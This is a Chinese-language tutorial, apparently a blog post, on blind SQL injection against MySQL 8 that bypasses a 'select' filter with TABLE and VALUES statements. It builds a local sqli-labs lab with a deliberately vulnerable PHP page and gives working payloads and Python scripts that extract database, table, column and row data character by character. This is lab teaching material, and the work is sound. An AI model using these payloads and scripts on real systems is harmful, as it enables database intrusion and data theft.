# **前言**

在mysql8.0之后又有了一个新特性，可以在过滤select的情况下，爆出我们需要的表名、字段、数据。

#  **环境配置**

##  **docker配置mysql**

 **环境是基于8.0.19之后的，phpstudy最高才到8.0.12，所以需要用docker来配置**

    
    
    docker run -d --name=mysql8 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.22
    

**如果执行时出现以下错误，则是系统自启了mysql占用了3306端口**

 **Error starting userland proxy: listen tcp4 0.0.0.0:3306: bind: address
already in use.**

 **这时候就需要先结束mysql进程**

    
    
    sudo service mysql stop
    docker ps -a            //刚才虽然报错，但已经启动了一个docker环境 需要查看进程号 
    docker rm 进程号         //结束进程
    docker run -d --name=mysql8 -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.22
    

**之后便可进入docker环境中的mysql**

    
    
    docker ps
    docker exec -it e33fc8311fd7 /bin/bash  //e33fc8311fd7 为进程号
    //进入mysql
    mysql -uroot -p123456
    //执行
    ALTER USER 'root' IDENTIFIED WITH mysql_native_password BY '123456';
    flush privileges;
    

## **搭建sql靶场**

[ **sql注入靶场**](https://www.sec-in.com/outLinkPage/?target=https://github.com/c0ny1/vulstudy)

    
    
    cd vulstudy/sqli-labs
    默认为80端口会与apache冲突，所以可以改成8082
    docker run -d -p 8082:80 c0ny1/sqli-labs:0.1        //c0ny1/sqli-labs:0.1要根据docker文件修改
    

**配置好后进入容器，修改配置文件**`db-creds.inc` **,**

    
    
    docker ps
    docker exec -it b7291beb46ba /bin/bash
    

**先安装vim命令**

    
    
    sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list
    apt-get clean && apt-get update && apt-get install vim
    

**配置**`db-creds.inc`

    
    
    cd /app/sql-connections/
    vim db-creds.inc
    

![wKg0C2JxHAaAdbWyAAA8PaPhvM0843.png](https://image.3001.net/images/20220510/1652165848_627a0cd8e3a48fbded406.png!small)

**修改less-1源码**

    
    
    cd /app/Less-1
    vim index.php
    

![wKg0C2JxHeaATGTAAD9duyrbgs233.png](https://image.3001.net/images/20220510/1652165849_627a0cd95d8f3a0239735.png!small)

    
    
    <?php
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    error_reporting(0);
    // take the variables 
    if(isset($_GET['id']))
    {
    $id=$_GET['id'];
    //logging the connection parameters to a file for analysis.
    $fp=fopen('result.txt','a');
    fwrite($fp,'ID:'.$id."\n");
    fclose($fp);
    
    // connectivity 
    function blacklist($id)
    {
        $id= preg_replace('/select/i',"", $id);
    
        return $id;
    }
    
    $id = blacklist($id);
    
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    
        if($row)
        {
        echo "<font size='5' color= '#99FF00'>";
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo 'Your Password:' .$row['password'];
        echo "</font>";
        }
        else 
        {
        echo '<font color= "#FFFF00">';
        print_r(mysql_error());
        echo "</font>";  
        }
    }
        else { echo "Please input the ID as parameter with numeric value";}
    
    ?>
    </font> </div></br></br></br><center>
    <img src="../images/Less-1.jpg" /></center>
    </body>
    </html>
    

**配置完成后重启环境**

    
    
    exit
    docker ps
    docker restart b7291beb46ba
    

![wKg0C2JxHfKAMCysAACFGH3F93A439.png](https://image.3001.net/images/20220510/1652165849_627a0cd9a6d4197c2336e.png!small)

**访问配置成功**

![wKg0C2JxHiWAQr8LAAFhZRgR5hk835.png](https://image.3001.net/images/20220510/1652165849_627a0cd9ddc220f6ac018.png!small)

 **这里其实也可以通过**`find / -name db-creds.inc` **命令查找配置文件，直接修改**

![wKg0C2JxHjKAaNm4AACP12O1bT8047.png](https://image.3001.net/images/20220510/1652165850_627a0cda2902ea0d60064.png!small)

#  **前置知识**

 **在mysql8之后，多了两个新的用法**`table` **,**`value`

##  **table**

[ **MySQL :: MySQL 8.0 Reference Manual :: 13.2.12 TABLE
Statement**](https://www.sec-in.com/outLinkPage/?target=https://dev.mysql.com/doc/refman/8.0/en/table.html)

    
    
    TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
    

**TABLE 语句在某些方面的作用类似于 SELECT。给定一个名为 的表的存在，以下两个语句产生相同的输出：t**

    
    
    TABLE users;
    等于
    SELECT * FROM users;
    

![wKg0C2JxHjAelZuAADNVJMifY8044.png](https://image.3001.net/images/20220510/1652165850_627a0cda6421ce54a0e1c.png!small)

### **区别**

 **1.TABLE始终显示表的所有列**  
 **2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句**

##  **values**

[ **MySQL :: MySQL 8.0 Reference Manual :: 13.2.14 VALUES
Statement**](https://www.sec-in.com/outLinkPage/?target=https://dev.mysql.com/doc/refman/8.0/en/values.html)

    
    
    VALUES row_constructor_list [ORDER BY column_designator] [LIMIT number]
    
    row_constructor_list:
        ROW(value_list)[, ROW(value_list)][, ...]
    
    value_list:
        value[, value][, ...]
    
    column_designator:
        column_index
    

**VALUES是MySQL 8.0.19中引入的DML语句，它以表的形式返回一组一行或多行。换句话说，它是一个表值构造函数，也用作独立的 SQL
语句。**

    
    
    mysql> VALUES ROW(1,2,3);
    +----------+----------+----------+
    | column_0 | column_1 | column_2 |
    +----------+----------+----------+
    |        1 |        2 |        3 |
    +----------+----------+----------+
    1 row in set (0.00 sec)
    
    
    mysql> VALUES ROW(1,-2,3), ROW(5,7,9), ROW(4,6,8);
    +----------+----------+----------+
    | column_0 | column_1 | column_2 |
    +----------+----------+----------+
    |        1 |       -2 |        3 |
    |        5 |        7 |        9 |
    |        4 |        6 |        8 |
    +----------+----------+----------+
    3 rows in set (0.00 sec)
    

`values` **也可以结合**`union` **使用，判断列数和进行注入**

    
    
    mysql> select * from users where id = 1 union values row(1,2,3);
    +----+----------+----------+
    | id | username | password |
    +----+----------+----------+
    |  1 | Dumb     | Dumb     |
    |  1 | 2        | 3        |
    +----+----------+----------+
    2 rows in set (0.00 sec)
    

# **利用方式**

##  **爆数据库**

    
    
    table information_schema.schemata;# 列出所有数据库信息
    

![wKg0C2JxHlAdTLZAADShfTGksM523.png](https://image.3001.net/images/20220510/1652165850_627a0cdaaabdaa7f06fe5.png!small)

**这里可以看到第一列数据为def、第二列数据为数据库名security，可以用以下方式进行判断**

    
    
    http://192.168.199.155:8082/Less-1/?id=1' and  (table information_schema.schemata limit 4,1)>=('def','0',3,4,5,6)--+ 
    

**当为**`s` **时正常回显**

![wKg0C2JxHnSAFtqkAACZLG02kKU682.png](https://image.3001.net/images/20220510/1652165850_627a0cdaef68c2ddfa65e.png!small)

 **但当改为**`s` **的下一位**`t` **时，回显消失，由此也可以判断出数据库的第一位为s，以此类推可以爆出数据库名称**`security`

![wKg0C2JxHnuAEQSUAACQCjikpVU300.png](https://image.3001.net/images/20220510/1652165851_627a0cdb2c7ae9ef43cdc.png!small)

 **这里也可以用我写好的脚本来跑库名(脚本能力偏弱，可能存在很多问题 望师傅们指正)**

    
    
    import requests
    
    url="http://192.168.199.155:8082/Less-1/"
    flag=''
    a=''
    for i in range(1,100):
        m=32
        n=127
        while 1:
            b = 1
            mid=(m+n)//2
            payload="?id=1' and  (table information_schema.schemata limit 4,1)>=('def','{}',3,4,5,6)--+".format(a+chr(mid))
            r=requests.get(url=url+payload)
            #print(payload)
            if "Dumb"  not in r.text:
                n=mid
            else:
                m=mid
            if(chr(mid)=="~" or chr(mid)=="+"):
                b=0
                break
            if(m+1==n):
                a+=chr(m)
                print(a)
                break
        if(b==0):
            break
    

**当然这里如果只是过滤了select并且能回显的话用**`-1 union values row(1,database(),3)--+`
**就完全可以查出数据库名称(这里不行)**

 **，除此外用concat(1,database(),3)跑常规盲注脚本也是可以的，毕竟爆数据库名没有必要一定用select**

##  **爆表名**

    
    
    table information_schema.tables; # 列出所有表的信息
    

**这条命令会列出所有数据库中的表，并且由于**`table` **不能用**`where`
**，所以就需要我们自己先去找对应数据库的位置，除此外**`information_schema.tables`
**共有21列，所有记录的**`TABLE_CATALOG` **的值都是**`def` **。**

![wKg0C2JxHp2ADW2AABUu8Ds1Sw049.png](https://image.3001.net/images/20220510/1652165851_627a0cdbc9815c4f3ed32.png!small)

**这里还是写了一个脚本来跑对应的列值，一个payload匹配的话很容易匹配错误，所以这里采用两种判断方式一起进行来增加成功率(range的值可以根据需要修改)**

    
    
    import requests
    
    url="http://192.168.199.155:8082/Less-1/"
    
    for i in range(300,330):
            payload1="?id=1' and ('def','security','0','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21) <=(table information_schema.tables limit {},1)--+".format(i)
            payload2="?id=1' and ('def','security','0','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21) <=(table information_schema.tables limit {},1)--+".format(i)
            r1=requests.get(url=url+payload1)
            r2=requests.get(url=url+payload2)
            #print(payload)
            if "Dumb"  in r1.text and "Dumb"  in r2.text:
                print(i)
    

**这里跑出322-325是关于数据库security的，之后就可以爆表名了(脚本与跑数据库的基本相同就改了个payload)**

    
    
    import requests
    
    url="http://192.168.199.155:8082/Less-1/"
    flag=''
    a=''
    for i in range(1,100):
        m=32
        n=127
        while 1:
            b = 1
            mid=(m+n)//2
            payload="?id=1' and ('def','security','{}','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 322,1)--+".format(a+chr(mid))
            r=requests.get(url=url+payload)
            #print(payload)
            if "Dumb"  not in r.text:
                n=mid
            else:
                m=mid
            if(chr(mid)=="~" or chr(mid)=="+"):
                b=0
                break
            if(m+1==n):
                a+=chr(m)
                print(a)
                break
        if(b==0):
            break
    

**分别跑出322-325的表名users，emails，uagents，referers**

##  **爆字段**

    
    
    table information_schema.columns;# 列出所有表的信息
    

**列出所有表的信息，所以就需要找到对应数据库，与表名的那几条数据，除此外**`information_schema.columns`
**表有22列，所有记录的**`TABLE_CATALOG` **都是def**

![wKg0C2JxHqqAQUPAABj9nvb24I522.png](https://image.3001.net/images/20220510/1652165852_627a0cdc0c637a6641419.png!small)

 **跟之前一样还是脚本跑对应的列号，**`770-772`

    
    
    import requests
    
    url="http://192.168.199.155:8082/Less-1/"
    
    for i in range(1,3430):
            payload1="?id=1' and ('def','security','users','0','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22) <=(table information_schema.columns limit {},1)--+".format(i)
            payload2="?id=1' and ('def','security','users','z','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22) >= (table information_schema.columns limit {},1)--+".format(i)
            r1=requests.get(url=url+payload1)
            r2=requests.get(url=url+payload2)
            if "Dumb"  in r1.text and "Dumb"  in r2.text:
                print(i)
    

**判断完列号后，直接跑字段**

    
    
    import requests
    
    url="http://192.168.199.155:8082/Less-1/"
    flag=''
    a=''
    for i in range(1,100):
        m=32
        n=127
        while 1:
            b = 1
            mid=(m+n)//2
            payload="?id=1' and ('def','security','users','{}','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)<=(table information_schema.columns limit 770,1)--+".format(a+chr(mid))
            r=requests.get(url=url+payload)
            #print(payload)
            if "Dumb"  not in r.text:
                n=mid
            else:
                m=mid
            if(chr(mid)=="~" or chr(mid)=="+"):
                b=0
                break
            if(m+1==n):
                a+=chr(m)
                print(a)
                break
        if(b==0):
            break
    

**由于linux列名忽略大小写问题，所以这里爆出的字段会有些大小写不一：id,username,password**

##  **爆数据**

**由于环境问题爆的没有那么准确，就比如第一个值是1，当爆到0后就该停止，但时候当循环到字母时，由于字母解析问题会将单个字母当做0来处理，就造成了数据冗余(payload中三个回显位的位置，代表id,username,password，当爆完id后就可爆username,其次password)**

    
    
    import requests
    
    url="http://192.168.199.155:8082/Less-1/"
    flag=''
    a=''
    for i in range(1,100):
        m=32
        n=127
        while 1:
            b = 1
            mid=(m+n)//2
            payload="?id=1' and ('{}','',1) <= (table security.users limit 0,1)--+".format(a+chr(mid))
            r=requests.get(url=url+payload)
            print(payload)
            if "Dumb"  not in r.text:
                n=mid
            else:
                m=mid
            if(chr(mid)=="~" or chr(mid)=="+"):
                b=0
                break
            if(m+1==n):
                a+=chr(m)
                print(a)
                break
        if(b==0):
            break
    

**除此外当我们得到表名其实也可以通过**`select * from users where id =1 union table users;`
**这种方式来获取其中的数据**

    
    
    mysql> select * from emails where id =1 union table emails ;
    +----+------------------------+
    | id | email_id               |
    +----+------------------------+
    |  1 | Dumb@dhakkan.com       |
    |  2 | Angel@iloveu.com       |
    |  3 | Dummy@dhakkan.local    |
    |  4 | secure@dhakkan.local   |
    |  5 | stupid@dhakkan.local   |
    |  6 | superman@dhakkan.local |
    |  7 | batman@dhakkan.local   |
    |  8 | admin@dhakkan.com      |
    +----+------------------------+
    8 rows in set (0.00 sec)﻿

